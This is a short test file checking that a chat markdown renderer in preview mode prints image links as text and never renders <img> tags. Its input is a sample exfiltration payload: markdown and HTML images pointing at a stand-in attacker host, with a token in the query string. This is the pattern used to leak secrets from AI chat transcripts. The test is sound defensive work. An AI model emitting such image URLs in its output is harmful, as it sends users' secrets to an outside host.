import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { ChatMarkdown } from "../../../phone/ChatPane/ChatMarkdown";

describe("ChatMarkdown with imagesAsText (the Agents modal preview)", () => {
  it("never renders an <img>, so a transcript's image URL isn't fetched", () => {
    const html = renderToStaticMarkup(
      createElement(ChatMarkdown, {
        source: "Look: ![secret](https://evil.example/x.png?d=token) and <img src=https://evil.example/y>",
        imagesAsText: true,
      }),
    );
    expect(html).not.toMatch(/<img/i);
    expect(html).toContain("[secret] https://evil.example/x.png?d=token");
  });
});
